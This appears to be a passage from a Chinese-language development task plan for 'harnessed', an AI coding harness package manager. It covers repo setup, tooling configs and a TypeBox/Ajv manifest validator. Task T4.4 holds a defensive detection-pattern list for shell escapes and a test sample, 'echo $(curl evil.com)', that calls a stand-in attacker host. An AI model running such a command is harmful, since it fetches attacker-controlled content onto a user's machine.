# Phase 1.1 Task Plan (planning-with-files 主计划)

> **状态**：ready for execute-phase
> **维护规则**：每完成一个 task → 勾选 + 同步 `progress.md`（追加 ISO 日期 + task ID + 简短结果）
> **决策回溯**：所有 "为什么这么做" 的疑问 → 查 `PLAN.md` § 7 接口契约 / `docs/adr/0001` / `docs/adr/0002` / `phase-1.1/GRAY-AREA-1` / `phase-1.1/GRAY-AREA-2` / `phase-1.1/ASSUMPTIONS.md`
> **执行策略**：每个 task 完成后 commit；commit message 格式 `phase-1.1: T<N>.<M> <action>`；建议每个子任务用 `/ralph-loop` 包裹直到输出 COMPLETE

---

## Phase 1.1 Acceptance Bar (verify before mark phase done)

(来自 PLAN.md § 4.1 — 必须全部 ✅)

- [ ] **A1** `pnpm test` 输出 ≥ 50 测试 passed
- [ ] **A2** ctx7 manifest 在正向测试中 pass（真实上游验证 schema 充分性）
- [ ] **A3** ≥ 35 个负向测试 + 行号 assertion 全绿
- [ ] **A4** GitHub Actions mac/linux/win × Node 22 = 3 jobs 全 ✅
- [ ] **A5** `npx ajv compile -s schemas/manifest.v1.schema.json --strict=true` exit 0
- [ ] **A6** vitest bench 100 manifest < 50ms
- [ ] **A7** ADR 0001/0002 主体未被 phase 1.1 修改（仅允许 ADR 0003 errata）
- [ ] **A8** `git ls-files --eol manifests/*.yaml` 输出 LF

---

## Task Graph

### T1. 仓库骨架初始化（Day 1, 无依赖）

#### T1.1 创建 4 层目录骨架
- [ ] **目标**：建立 SPEC § 4 + B7 增补的完整仓库目录树
- **文件 / 命令**：
  ```bash
  cd /d/GitCode/harnessed
  mkdir -p manifests/tools manifests/skill-packs
  mkdir -p workflows
  mkdir -p routing
  mkdir -p config-templates/hooks
  mkdir -p vendor
  mkdir -p src/installers src/doctor src/routing-engine src/checkpoint
  mkdir -p src/manifest/schema/installMethods
  mkdir -p src/cli src/schemas
  mkdir -p tests/fixtures/manifests/valid tests/fixtures/manifests/invalid
  mkdir -p tests/fixtures/workflows/valid tests/fixtures/workflows/invalid
  mkdir -p tests/fixtures/routing/valid tests/fixtures/routing/invalid
  mkdir -p tests/unit tests/integration
  mkdir -p docs/adr docs/benchmarks
  mkdir -p schemas
  mkdir -p scripts
  mkdir -p .github/workflows
  ```
- **验收**：
  - [ ] `find . -type d -not -path './.planning*' -not -path './.git*' | sort` 列出全部 ≥ 22 个目录
  - [ ] 每个新建目录可写 .gitkeep（无权限错误）
- **决策来源**：PROJECT-SPEC § 4 + ASSUMPTIONS B7 增补 + ADR 0001 + ADR 0002

---

#### T1.2 写 `.gitattributes` 强制 yaml/json/md 行尾 LF（C3 mitigation Day 1 落地）
- [ ] **目标**：避免 Windows checkout 后 yaml/json 被 autocrlf 篡改导致 Ajv 解析失败
- **文件**：`/d/GitCode/harnessed/.gitattributes`
- **内容**：
  ```gitattributes
  # 默认 LF 行尾（jeff atwood 推荐）
  * text=auto eol=lf

  # 关键配置文件强制 LF（避免 git autocrlf 干扰 Ajv yaml 解析）
  *.yaml text eol=lf
  *.yml text eol=lf
  *.json text eol=lf
  *.md text eol=lf
  *.ts text eol=lf
  *.tsx text eol=lf
  *.mjs text eol=lf
  *.cjs text eol=lf

  # 二进制文件保持
  *.png binary
  *.jpg binary
  *.ico binary
  *.lock binary

  # CLI 入口 LF（避免 shebang 受 CRLF 影响而 spawn fail）
  bin/* text eol=lf
  scripts/*.sh text eol=lf
  ```
- **后置命令**（已有文件归一化）：
  ```bash
  cd /d/GitCode/harnessed
  git add --renormalize .
  ```
- **验收**：
  - [ ] `git ls-files --eol .gitattributes` 输出含 `lf`
  - [ ] 在 Windows 上 `git rm --cached -r .` && `git reset --hard` 后 yaml/json 行尾仍是 LF
- **决策来源**：ASSUMPTIONS C3 callout

---

#### T1.3 增补 `.gitignore` + `vendor/ENTRY-CRITERIA.md` 占位
- [ ] **目标**：确保 dist / node_modules / .harnessed / 测试覆盖率产物不入仓
- **文件 1**：`/d/GitCode/harnessed/.gitignore`（在现有基础上增补）
- **追加内容**：
  ```gitignore
  # node / pnpm
  node_modules/
  .pnpm-store/

  # build outputs
  dist/
  .tscache/
  *.tsbuildinfo

  # test
  coverage/
  *.snap
  .vitest-cache/

  # runtime / harnessed user state
  .harnessed/

  # IDE / OS
  .vscode/
  .idea/
  .DS_Store
  Thumbs.db
  ```
- **文件 2**：`/d/GitCode/harnessed/vendor/ENTRY-CRITERIA.md`
- **内容**（直接复制 SPEC § 8.2）：
  ```markdown
  # vendor/ Entry Criteria

  > 来源：PROJECT-SPEC.md v2.1 § 8.2

  ## Mandatory（同时全部满足）
  - license: MIT / Apache-2.0 / BSD-3-Clause / ISC / 0BSD
  - upstream_archived_or_unmaintained: true（上游已停摆）
  - vendor_size_max_kb: 500（单 vendor ≤ 500KB）
  - vendor_owner_signed: true（PR 须 maintainer 显式签字）

  ## Forbidden
  - GPL / AGPL / SSPL 上游
  - binary 二进制

  ## CI 守门
  - 体积监控：`du -ks vendor/* | awk '$1 > 500 {exit 1}'`
  - License 校验：vendor PR 必须含 LICENSE 文件 + SPDX-License-Identifier 正确

  v0.1 vendor/ 应保持空。任何 PR 增加 vendor 须先 issue 讨论。
  ```
- **验收**：
  - [ ] `pnpm install` 后 `node_modules/` 不入 git
  - [ ] `vendor/ENTRY-CRITERIA.md` 存在且 ≥ 20 行
- **决策来源**：SPEC § 8.2 + ADR 0002 § CI 守护

---

#### T1.4 写 LICENSE（Apache-2.0）+ NOTICE
- [ ] **目标**：满足 Apache-2.0 license 形式要求 + Harness Inc. 商标 disclaimer
- **文件 1**：`/d/GitCode/harnessed/LICENSE`
- **内容**：完整 Apache License 2.0 文本（从 https://www.apache.org/licenses/LICENSE-2.0.txt 复制）+ 版权头：
  ```
  Copyright 2026 harnessed maintainers

  Licensed under the Apache License, Version 2.0 (the "License");
  ...（完整文本）
  ```
- **文件 2**：`/d/GitCode/harnessed/NOTICE`
- **内容**：
  ```
  harnessed
  Copyright 2026 harnessed maintainers

  Not affiliated with, endorsed by, or sponsored by Harness Inc.
  The "harnessed" name refers to the Anthropic Claude Code "harness" terminology
  and reflects the project's role as a composition orchestrator over AI coding harnesses.

  ----

  Upstream attributions are tracked separately in NOTICES.md (populated as upstream
  manifests are added).
  ```
- **文件 3**：`/d/GitCode/harnessed/NOTICES.md`（占位 — 上游 attribution 实际填充由 phase 1.2 installer 完成）
- **内容**：
  ```markdown
  # Third-Party Notices

  > Auto-populated by `harnessed install` from manifest `metadata.upstream.notice` fields.
  > v0.1.0 phase 1.1 starts empty; phase 1.2+ adds entries per upstream installed.

  No third-party content vendored as of v0.1.0-alpha.1 (phase 1.1).
  ```
- **验收**：
  - [ ] `wc -l LICENSE` ≥ 200 行（完整 Apache-2.0 文本）
  - [ ] NOTICE 含 "Not affiliated with Harness Inc."
- **决策来源**：SPEC § 1 + § 7 风险表（Harness 商标）+ R8.4 占位

---

#### T1.5 各层目录占位 README + .gitkeep
- [ ] **目标**：避免空目录被 git 忽略；每层目录有可读 README ≤ 30 行说明用途
- **文件**：
  - `manifests/README.md`：说明这是上游描述层（不 vendor，仅声明 install/check），引用 ADR 0001 + manifests/SCHEMA.md
  - `workflows/README.md`：说明这是 composition skill 层，引用 SPEC § 10 + workflows/SCHEMA.md
  - `routing/README.md`：说明这是 B+C 路由 SSOT，引用 SPEC § 9 + routing/SCHEMA.md
  - `config-templates/README.md`：说明这是配置注入层，hook 必须纯 yaml/md
  - `schemas/README.md`：说明这是可独立 publish 的 JSON Schema artifact 目录
  - `tests/README.md`：说明 fixture 组织规则
  - `manifests/tools/.gitkeep` `manifests/skill-packs/.gitkeep` `vendor/.gitkeep` `config-templates/hooks/.gitkeep`（避免空目录被 git 丢）
- **验收**：
  - [ ] `find . -name 'README.md' -not -path './node_modules*' | wc -l` ≥ 7
  - [ ] 每个 README 含 "see ADR / SPEC § X 关联文档" 链接
- **决策来源**：B7 一致性 + SPEC § 4

---

### T2. 工具链初始化（依赖 T1）

#### T2.1 写 `package.json`（直接复制 ADR 0002 模板）
- [ ] **目标**：装好 corepack + pnpm 10.12 + 全部 runtime/dev deps
- **文件**：`/d/GitCode/harnessed/package.json`
- **内容**：直接复制 GRAY-AREA-2 § 推荐 package.json 模板（已 ready-to-use）；占位字段 `<owner>` 替换为实际 GitHub 用户名 / 组织名
- **执行命令**：
  ```bash
  cd /d/GitCode/harnessed
  corepack enable
  pnpm install
  ```
- **验收**：
  - [ ] `pnpm -v` 输出 10.12.x
  - [ ] `cat node_modules/.pnpm-store/v10/...` 存在（corepack pin 生效）
  - [ ] `pnpm install --frozen-lockfile` 在 mac / linux / windows 三平台都成功
- **决策来源**：ADR 0002 § 1-2 + GRAY-AREA-2 § package.json 模板

---

#### T2.2 写 `tsconfig.json`（ADR 0002 模板）
- [ ] **目标**：TS 严格模式 + Node 22 ESM target + tsc 仅 typecheck
- **文件**：`/d/GitCode/harnessed/tsconfig.json`
- **内容**：直接复制 GRAY-AREA-2 § 推荐 tsconfig.json 模板
- **验收**：
  - [ ] `pnpm typecheck` exit 0（暂时空 src 也应通过）
  - [ ] `tsconfig.json` 含 `"noEmit": true` `"verbatimModuleSyntax": true` `"noUncheckedIndexedAccess": true`
- **决策来源**：ADR 0002 § 3 + ASSUMPTIONS B9

---

#### T2.3 写 `tsup.config.ts`（ADR 0002 模板）
- [ ] **目标**：tsup 自动处理 shebang / chmod +x / pure ESM 输出
- **文件**：`/d/GitCode/harnessed/tsup.config.ts`
- **内容**：直接复制 GRAY-AREA-2 § 推荐 tsup.config.ts 模板（含 entry: index/cli/schemas）
- **验收**：（在 T2.6 后）
  - [ ] `pnpm build` 产出 `dist/cli.mjs` 含 `#!/usr/bin/env node` 顶行
  - [ ] Linux/Mac 上 `dist/cli.mjs` mode 含 `+x`
  - [ ] `node ./dist/cli.mjs --version` exit 0
- **决策来源**：ADR 0002 § 3 + GSD issue #2453 教训

---

#### T2.4 写 `biome.json`（ADR 0002 模板）
- [ ] **目标**：单工具 lint + format
- **文件**：`/d/GitCode/harnessed/biome.json`
- **内容**：直接复制 GRAY-AREA-2 § 推荐 biome.json 模板
- **验收**：
  - [ ] `pnpm lint` exit 0（空 src 也应通过）
  - [ ] `pnpm lint:fix` 后无 diff（or 仅自动修复符合预期）
- **决策来源**：ADR 0002 § 6

---

#### T2.5 写 `vitest.config.ts`
- [ ] **目标**：vitest 4 + coverage v8 + tests/ 目录约定
- **文件**：`/d/GitCode/harnessed/vitest.config.ts`
- **内容**：
  ```ts
  import { defineConfig } from 'vitest/config'

  export default defineConfig({
    test: {
      include: ['tests/**/*.test.ts'],
      coverage: {
        provider: 'v8',
        reporter: ['text', 'json', 'lcov'],
        include: ['src/**/*.ts'],
        exclude: ['src/**/*.test.ts', 'src/cli.ts'],
        thresholds: {
          statements: 80,
          branches: 75,
          functions: 80,
          lines: 80,
        },
      },
      benchmark: {
        include: ['tests/integration/*.bench.ts'],
      },
    },
  })
  ```
- **验收**：
  - [ ] `pnpm test` 跑通空白用例（exit 0 + 0 测试 0 失败）
  - [ ] `pnpm test:coverage` 输出 lcov 报告
- **决策来源**：ADR 0002 § 4 + ASSUMPTIONS B3

---

#### T2.6 占位 `src/index.ts` `src/cli.ts` `src/schemas/index.ts`
- [ ] **目标**：tsup 三入口可 build 出 dist/{index,cli,schemas/index}.mjs
- **文件 1**：`/d/GitCode/harnessed/src/cli.ts`
- **内容**：
  ```ts
  #!/usr/bin/env node
  import { Command } from 'commander'

  const program = new Command()

  program
    .name('harnessed')
    .description('AI coding harness package manager + composition orchestrator')
    .version('0.1.0-alpha.1')

  program.parse(process.argv)
  ```
- **文件 2**：`/d/GitCode/harnessed/src/index.ts`
- **内容**：
  ```ts
  // Main library entry — re-exports public APIs.
  // phase 1.1: only schema validator exported.
  // phase 1.2+: installer adapters / routing engine etc.

  export { validateManifestFile } from './manifest/validate.js'
  export type { Manifest } from './manifest/types.js'
  ```
- **文件 3**：`/d/GitCode/harnessed/src/schemas/index.ts`
- **内容**：
  ```ts
  // Re-export schemas for third-party consumers via `harnessed/schemas` exports field.
  // phase 1.1: TypeBox schema objects + JSON Schema URIs.
  export { ManifestSchema } from '../manifest/schema/index.js'
  ```
- **占位类型**（避免 build fail）：
  - 在 `src/manifest/types.ts` 占位 `export type Manifest = unknown` — T3.1 完成后 replace
  - 在 `src/manifest/validate.ts` 占位 throw stub — T4.1 完成后 replace
- **验收**：
  - [ ] `pnpm build` 产出 dist/{cli.mjs, index.mjs, schemas/index.mjs}
  - [ ] `node ./dist/cli.mjs --version` 输出 `0.1.0-alpha.1`
  - [ ] mac/linux 上 `dist/cli.mjs` mode 含 `+x`
- **决策来源**：ADR 0002 § 3 + GA-1 § 代码结构

---

### T3. manifest schema v1 实现（依赖 T2）

#### T3.1 TypeBox schema 入口 + apiVersion / kind
- [ ] **目标**：建立 schema 主入口与版本字段
- **文件 1**：`/d/GitCode/harnessed/src/manifest/schema/apiVersion.ts`
- **内容**：
  ```ts
  import { Type } from '@sinclair/typebox'

  export const ApiVersion = Type.Literal('harnessed/v1')
  export const Kind = Type.Literal('Manifest')
  ```
- **文件 2**：`/d/GitCode/harnessed/src/manifest/schema/index.ts`
- **内容**（骨架，T3.2 / T3.3 填充 metadata / spec）：
  ```ts
  import { Type, type Static } from '@sinclair/typebox'
  import { ApiVersion, Kind } from './apiVersion.js'
  import { MetadataSchema } from './metadata.js'
  import { SpecSchema } from './spec.js'

  export const ManifestSchema = Type.Object(
    {
      apiVersion: ApiVersion,
      kind: Kind,
      metadata: MetadataSchema,
      spec: SpecSchema,
    },
    { additionalProperties: false }
  )

  export type Manifest = Static<typeof ManifestSchema>
  ```
- **同步**：`src/manifest/types.ts` 替换为 `export type { Manifest } from './schema/index.js'`
- **验收**：
  - [ ] `pnpm typecheck` 通过（即使 T3.2 / T3.3 暂未实装会 type error，需顺序完成）
- **决策来源**：ADR 0001 顶层结构 + GA-1 § 关键代码模式

---

#### T3.2 metadata 子 schema（含 upstream block）
- [ ] **目标**：完整覆盖 ADR 0001 metadata 必填字段 + SPDX license 白名单
- **文件**：`/d/GitCode/harnessed/src/manifest/schema/metadata.ts`
- **内容**（关键骨架）：
  ```ts
  import { Type } from '@sinclair/typebox'

  const SpdxLicense = Type.Union([
    Type.Literal('MIT'),
    Type.Literal('Apache-2.0'),
    Type.Literal('BSD-3-Clause'),
    Type.Literal('ISC'),
    Type.Literal('0BSD'),
  ])

  const Upstream = Type.Object(
    {
      source: Type.String({ minLength: 1 }),
      homepage: Type.String({ format: 'uri' }),
      repository: Type.String({ format: 'uri' }),
      license: SpdxLicense,
      notice: Type.String({ minLength: 1, maxLength: 500 }),
    },
    { additionalProperties: false }
  )

  export const MetadataSchema = Type.Object(
    {
      name: Type.String({ pattern: '^[a-z0-9][a-z0-9-]*$', minLength: 1 }),
      display_name: Type.Optional(Type.String()),
      description: Type.String({ maxLength: 120 }),
      upstream: Upstream,
    },
    { additionalProperties: false }
  )
  ```
- **验收**：
  - [ ] T8.4 reject 测试中 `unknown_field_in_metadata: foo` 被 reject
  - [ ] T8.5 SPDX 测试中 `license: GPL-3.0` 被 reject
- **决策来源**：ADR 0001 metadata 块 + SPDX 白名单

---

#### T3.3 spec 子 schema 主壳 + type × method 矩阵
- [ ] **目标**：完整覆盖 ADR 0001 spec 块 17 必填字段，矩阵用 oneOf + discriminator
- **文件**：`/d/GitCode/harnessed/src/manifest/schema/spec.ts`
- **内容**（关键骨架，install 字段引用 T3.4）：
  ```ts
  import { Type } from '@sinclair/typebox'
  import { InstallSchema } from './installMethods/index.js'

  const ComponentType = Type.Union([
    Type.Literal('command'),
    Type.Literal('behavior-rule'),
    Type.Literal('mcp-tool'),
    Type.Literal('cli-binary'),
  ])

  const TypeEnum = Type.Union([
    Type.Literal('cc-plugin'),
    Type.Literal('cc-skill-pack'),
    Type.Literal('mcp-npm'),
    Type.Literal('cli-npm'),
  ])

  const Verify = Type.Object(
    {
      cmd: Type.String(),
      timeout_ms: Type.Optional(Type.Integer({ minimum: 100, maximum: 60_000 })),
      expected_exit_code: Type.Optional(Type.Integer()),
    },
    { additionalProperties: false }
  )

  const Uninstall = Type.Object(
    {
      cmd: Type.String(),
      cleanup_paths: Type.Optional(Type.Array(Type.String())),
    },
    { additionalProperties: false }
  )

  const Stability = Type.Union([
    Type.Literal('stable'),
    Type.Literal('beta'),
    Type.Literal('unstable'),
    Type.Literal('archived'),
  ])

  const FallbackAction = Type.Union([
    Type.Literal('warn'),
    Type.Literal('block'),
    Type.Literal('use_alternative'),
  ])

  const UpstreamHealth = Type.Object(
    {
      stability: Stability,
      last_check: Type.String({ format: 'date' }),
      last_known_good_version: Type.String(),
      fallback_action: FallbackAction,
      alternative: Type.Optional(Type.String()),
    },
    { additionalProperties: false }
  )

  const Platform = Type.Union([
    Type.Literal('linux'),
    Type.Literal('darwin'),
    Type.Literal('win32'),
  ])

  export const SpecSchema = Type.Object(
    {
      type: TypeEnum,
      component_type: ComponentType,
      install: InstallSchema,                          // T3.4 提供 type×method discriminator union
      verify: Verify,
      uninstall: Uninstall,
      upstream_health: UpstreamHealth,
      signed_by: Type.String({ pattern: '^[a-zA-Z0-9-]+$', minLength: 1 }),
      signature: Type.Optional(
        Type.Object(
          { sigstore_bundle: Type.String({ format: 'uri' }) },
          { additionalProperties: false }
        )
      ),
      platforms: Type.Array(Platform, { minItems: 1, uniqueItems: true }),
      tested_with_versions: Type.Optional(
        Type.Object(
          {
            cc_versions: Type.Optional(Type.Array(Type.String())),
            node_versions: Type.Optional(Type.Array(Type.String())),
          },
          { additionalProperties: false }
        )
      ),
      mutually_exclusive_with: Type.Optional(Type.Array(Type.String())),
    },
    { additionalProperties: false }
  )
  ```
- **验收**：
  - [ ] T8.2 必填字段缺失测试 17 项全绿
  - [ ] T8.3 type × method 非法组合测试 18 项全绿
- **决策来源**：ADR 0001 spec 块 + type × method 矩阵表

---

#### T3.4 6 个 install method 差异化 schema
- [ ] **目标**：把 ADR 0001 type × method 矩阵翻译成 oneOf + discriminator
- **文件**：
  - `src/manifest/schema/installMethods/ccPluginMarketplace.ts`：method=`cc-plugin-marketplace` + git_ref required
  - `src/manifest/schema/installMethods/gitCloneWithSetup.ts`：method=`git-clone-with-setup` + git_ref required
  - `src/manifest/schema/installMethods/npxSkillInstaller.ts`：method=`npx-skill-installer` + npm_version required
  - `src/manifest/schema/installMethods/npmCli.ts`：method=`npm-cli` + npm_version required（ctx7）
  - `src/manifest/schema/installMethods/mcpStdio.ts`：method=`mcp-stdio-add` + npm_version required
  - `src/manifest/schema/installMethods/mcpHttp.ts`：method=`mcp-http-add` + npm_version required
  - `src/manifest/schema/installMethods/index.ts`：union with discriminator
- **每个 method schema 模板**（举例 ccPluginMarketplace.ts）：
  ```ts
  import { Type } from '@sinclair/typebox'

  export const CcPluginMarketplace = Type.Object(
    {
      method: Type.Literal('cc-plugin-marketplace'),
      cmd: Type.String({ minLength: 1 }),
      cwd: Type.Optional(Type.String()),
      env: Type.Optional(Type.Record(Type.String(), Type.String())),
      args: Type.Optional(Type.Record(Type.String(), Type.Unknown())),
      git_ref: Type.String({ minLength: 1 }),
      idempotent_check: Type.String({ minLength: 1 }),
    },
    { additionalProperties: false }
  )
  ```
- **`installMethods/index.ts` 关键**：
  ```ts
  import { Type } from '@sinclair/typebox'
  import { CcPluginMarketplace } from './ccPluginMarketplace.js'
  import { GitCloneWithSetup } from './gitCloneWithSetup.js'
  import { NpxSkillInstaller } from './npxSkillInstaller.js'
  import { NpmCli } from './npmCli.js'
  import { McpStdio } from './mcpStdio.js'
  import { McpHttp } from './mcpHttp.js'

  export const InstallSchema = Type.Union(
    [CcPluginMarketplace, GitCloneWithSetup, NpxSkillInstaller, NpmCli, McpStdio, McpHttp],
    { discriminator: { propertyName: 'method' } }
  )
  ```
- **type × method 矩阵约束**：在 ManifestSchema 顶层添加 if/then 约束（ADR 0001 矩阵表）：
  - 在 `src/manifest/schema/index.ts` 内额外组合：
    ```ts
    // After defining ManifestSchema base, wrap with allOf to add cross-field constraints:
    // - if spec.type == 'cc-plugin' then spec.install.method == 'cc-plugin-marketplace'
    // - if spec.type == 'cc-skill-pack' then method ∈ {cc-plugin-marketplace, git-clone-with-setup, npx-skill-installer}
    // - if spec.type == 'mcp-npm' then method ∈ {mcp-stdio-add, mcp-http-add}
    // - if spec.type == 'cli-npm' then method == 'npm-cli'
    ```
  - 实现方式：`Type.Intersect([ManifestBase, MatrixConstraint])` 配合 `if/then/else` JSON Schema keywords
- **验收**：
  - [ ] T8.3 矩阵测试 18 个非法组合全 reject + 错误信息精准（含 "type=X 不允许 method=Y"）
- **决策来源**：ADR 0001 type × method 矩阵表 + GA-1 § 关键代码模式

---

#### T3.5 reject list 字段约束（additionalProperties + dynamic shell escape detection）
- [ ] **目标**：4 项 reject（dynamic shell escape / eval / extends / unknown fields）
- **范围**：
  - **unknown fields**：每个 Type.Object 都已加 `additionalProperties: false`（T3.1-T3.4 已做） — 但需 sanity check 全树
  - **extends 字段**：JSON Schema 层在 schema 中无 `extends` 关键字声明，结合 `additionalProperties: false` 自然 reject
  - **dynamic shell escape / eval / `!ruby/regexp`**：JSON Schema 无法直接检测（需值层文本分析），由 T4.4 在 validate 入口实现 pre-Ajv pass
- **此 task 验收**：
  - [ ] grep 全部 schema 文件无遗漏 `additionalProperties: false`
  - [ ] 在 ManifestSchema 顶层 `additionalProperties: false`，metadata / spec / install 子 schema 全部 false
- **决策来源**：ADR 0001 拒绝清单

---

### T4. manifest validator 实现（依赖 T3）

#### T4.1 Ajv compile + strict mode + discriminator
- [ ] **目标**：建立 validator 单例
- **文件**：`/d/GitCode/harnessed/src/manifest/validate.ts`
- **关键代码**：
  ```ts
  import Ajv, { type ErrorObject } from 'ajv'
  import addFormats from 'ajv-formats'
  import { ManifestSchema } from './schema/index.js'
  import type { Manifest } from './schema/index.js'

  const ajv = addFormats(
    new Ajv({
      strict: true,
      strictSchema: true,
      strictTypes: true,
      strictRequired: true,
      allErrors: true,
      discriminator: true,
      allowUnionTypes: false,
    })
  )

  // Lazy compile to avoid cold-start cost.
  let _validate: ReturnType<typeof ajv.compile<Manifest>> | null = null
  export function getValidator() {
    if (!_validate) _validate = ajv.compile<Manifest>(ManifestSchema as never)
    return _validate
  }

  export type AjvError = ErrorObject
  ```
- **验收**：
  - [ ] `pnpm typecheck` 通过
  - [ ] T4.2 / T4.3 完成后 `getValidator()` 在测试中可成功 compile
- **决策来源**：GA-1 § 关键代码模式 + ADR 0001 strict mode

---

#### T4.2 yaml CST range → 行号映射
- [ ] **目标**：把 Ajv `instancePath`（如 `/spec/install/method`）映射到 yaml 文件实际行号
- **文件**：`/d/GitCode/harnessed/src/manifest/errors.ts`
- **关键代码**：
  ```ts
  import type { Document } from 'yaml'
  import type { ErrorObject } from 'ajv'

  export interface FriendlyError {
    file: string
    path: string                 // /spec/install/method
    message: string
    line: number | null
    column: number | null
    keyword: string              // ajv keyword (additionalProperties / discriminator / required ...)
    snippet?: string
  }

  /**
   * Locate the line/col of a JSON pointer instancePath inside a yaml CST.
   * Walks the doc.contents node tree using the path segments.
   */
  export function locateLineFromCST(
    doc: Document.Parsed,
    instancePath: string
  ): { line: number | null; column: number | null } {
    if (!instancePath || instancePath === '/') return { line: 1, column: 1 }
    const segments = instancePath.split('/').filter(Boolean)
    let node: any = doc.contents
    for (const seg of segments) {
      if (!node) break
      if (node.items) {
        // YAMLMap: items are Pair[]
        const pair = node.items.find((p: any) => String(p.key?.value) === seg)
        if (!pair) {
          node = null
          break
        }
        node = pair.value
      } else if (Array.isArray(node)) {
        node = node[Number(seg)]
      } else {
        node = null
      }
    }
    if (!node || !node.range) return { line: null, column: null }
    const [start] = node.range as [number, number, number]
    const line = doc.lineCounter?.linePos(start)?.line ?? null
    const column = doc.lineCounter?.linePos(start)?.col ?? null
    return { line, column }
  }

  export function toFriendly(
    err: ErrorObject,
    doc: Document.Parsed,
    file: string
  ): FriendlyError {
    const { line, column } = locateLineFromCST(doc, err.instancePath)
    return {
      file,
      path: err.instancePath || '/',
      message: err.message ?? 'unknown error',
      line,
      column,
      keyword: err.keyword,
    }
  }
  ```
- **验收**：（在 T8.5 行号测试中验证）
  - [ ] 5+ 个故意写错的 yaml 文件错误信息行号 = 实际行号（偏差 0）
- **决策来源**：GA-1 § 关键代码模式 + B6 mandatory line-precision

---

#### T4.3 `validateManifestFile(yamlSource, filename)` 公开 API
- [ ] **目标**：单一入口接受 yaml 字符串 + 文件名 → 返回 `{ok, manifest|errors}` discriminated union
- **文件**：`/d/GitCode/harnessed/src/manifest/validate.ts`（增补 T4.1 内容）
- **关键代码增补**：
  ```ts
  import { parseDocument, LineCounter } from 'yaml'
  import { toFriendly, type FriendlyError } from './errors.js'
  import { detectShellEscape } from './shellEscape.js'   // T4.4

  export type ValidateResult =
    | { ok: true; manifest: Manifest }
    | { ok: false; errors: FriendlyError[] }

  export function validateManifestFile(
    yamlSource: string,
    filename: string
  ): ValidateResult {
    // Pre-Ajv pass: dynamic shell escape detection (T4.4)
    const shellErrors = detectShellEscape(yamlSource, filename)
    if (shellErrors.length) return { ok: false, errors: shellErrors }

    const lineCounter = new LineCounter()
    const doc = parseDocument(yamlSource, { lineCounter })

    if (doc.errors.length) {
      return {
        ok: false,
        errors: doc.errors.map((e) => ({
          file: filename,
          path: '/',
          message: e.message,
          line: e.linePos?.[0]?.line ?? null,
          column: e.linePos?.[0]?.col ?? null,
          keyword: 'yaml-parse',
        })),
      }
    }
    const data = doc.toJS()
    const validate = getValidator()
    if (!validate(data)) {
      return {
        ok: false,
        errors: (validate.errors ?? []).map((err) => toFriendly(err, doc, filename)),
      }
    }
    return { ok: true, manifest: data as Manifest }
  }
  ```
- **同步**：`src/index.ts` re-export 已配置
- **验收**：
  - [ ] T8.1 正向测试 9 上游 manifest 全 pass
  - [ ] 返回 `{ok: false}` 时 `errors[i].line` 在 yaml 解析失败 / schema 失败两种 case 都填充
- **决策来源**：GA-1 § 校验入口

---

#### T4.4 shell escape 自定义检测（pre-Ajv pass）
- [ ] **目标**：reject `${...}` `$(...)` `eval` `!ruby/regexp` 等动态求值
- **文件**：`/d/GitCode/harnessed/src/manifest/shellEscape.ts`
- **关键代码**：
  ```ts
  import type { FriendlyError } from './errors.js'

  /**
   * ADR 0001 reject list — block dynamic shell escape / eval / yaml dangerous tags.
   * Operates on raw yaml string before parsing to catch `!ruby/regexp` etc.
   */
  const DANGEROUS_PATTERNS: { pattern: RegExp; reason: string }[] = [
    // shell command substitution
    { pattern: /\$\([^)]*\)/, reason: 'shell command substitution $(...)' },
    // bash variable / shell escape (allow ${var} only inside install.cmd templating? — no, ADR 0001 forbids dynamic eval entirely)
    { pattern: /\$\{[^}]*\}/, reason: 'shell variable expansion ${...}' },
    // explicit eval keyword in any value
    { pattern: /\beval\s*\(/, reason: 'explicit eval(...) call' },
    // yaml dangerous tags
    { pattern: /!ruby\/regexp/, reason: 'unsafe yaml tag !ruby/regexp' },
    { pattern: /!python\//, reason: 'unsafe yaml tag !python/...' },
    { pattern: /!!python\//, reason: 'unsafe yaml tag !!python/...' },
  ]

  export function detectShellEscape(source: string, file: string): FriendlyError[] {
    const errors: FriendlyError[] = []
    const lines = source.split(/\r?\n/)
    for (const { pattern, reason } of DANGEROUS_PATTERNS) {
      for (let i = 0; i < lines.length; i++) {
        if (pattern.test(lines[i])) {
          errors.push({
            file,
            path: '/',
            line: i + 1,
            column: lines[i].search(pattern) + 1,
            keyword: 'shell-escape-rejected',
            message: `Dynamic evaluation forbidden: ${reason}. ADR 0001 reject list.`,
          })
        }
      }
    }
    return errors
  }
  ```
- **验收**：
  - [ ] T8.4 reject 测试中 `cmd: "echo $(curl evil.com)"` 被 reject + 行号定位正确
- **决策来源**：ADR 0001 reject list + R9.3 安全

---

### T5. JSON Schema artifact publish 准备（依赖 T4）

#### T5.1 build-schema 脚本 → manifest.v1.schema.json
- [ ] **目标**：把 TypeBox 对象 stringify 成标准 JSON Schema 文件
- **文件**：`/d/GitCode/harnessed/scripts/build-schema.ts`
- **关键代码**：
  ```ts
  import { writeFileSync, mkdirSync } from 'node:fs'
  import { dirname } from 'node:path'
  import { ManifestSchema } from '../src/manifest/schema/index.js'

  const OUT = 'schemas/manifest.v1.schema.json'
  const wrapped = {
    $schema: 'https://json-schema.org/draft/2020-12/schema',
    $id: 'https://harnessed.dev/schemas/manifest.v1.schema.json',
    title: 'harnessed Manifest v1',
    description: 'Per ADR 0001. Strict mode (additionalProperties: false everywhere).',
    ...ManifestSchema,
  }

  mkdirSync(dirname(OUT), { recursive: true })
  writeFileSync(OUT, JSON.stringify(wrapped, null, 2) + '\n', 'utf8')
  console.log(`Wrote ${OUT}`)
  ```
- **package.json scripts 增补**：
  ```json
  "build:schema": "tsx scripts/build-schema.ts"
  ```
  （需添加 `tsx` 到 devDependencies — 或用 tsup pre-bundle 后 node 跑）
- **验收**：
  - [ ] `pnpm build:schema` 输出 `schemas/manifest.v1.schema.json`（≥ 100 行 JSON）
  - [ ] 文件含 `$schema: draft/2020-12` + `additionalProperties: false`
- **决策来源**：GA-1 § publish + C1（draft-2020-12 统一）

---

#### T5.2 workflow phases JSON Schema
- [ ] **目标**：workflows/*/SKILL.md frontmatter 的 phases 数组 schema
- **文件 1**：`/d/GitCode/harnessed/src/workflow/schema.ts`（TypeBox）
- **关键代码**：
  ```ts
  import { Type, type Static } from '@sinclair/typebox'

  const Layer = Type.Union([
    Type.Literal('governance'),
    Type.Literal('orchestration'),
    Type.Literal('execution'),
  ])

  const PhaseSchema = Type.Object(
    {
      id: Type.String({ pattern: '^[0-9]{2}-[a-z][a-z0-9-]*$' }),
      layer: Layer,
      upstream: Type.Union([Type.String(), Type.Array(Type.String())]),
